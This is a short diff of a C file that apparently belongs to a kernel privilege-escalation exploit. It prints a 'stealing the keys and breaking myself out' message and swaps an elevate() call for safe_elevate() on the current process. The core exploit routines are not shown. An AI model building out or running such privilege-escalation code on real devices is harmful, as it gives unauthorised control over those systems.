@@ -45,7 +45,7 @@ int main()
            toolbox->offsets->kernproc);
 
     printf("\n[*] Stealing the keys and breaking myself out - ");
-    if (elevate(toolbox, getpid()))
+    if (safe_elevate(toolbox, getpid()))
         return 1;
 
     return 0;
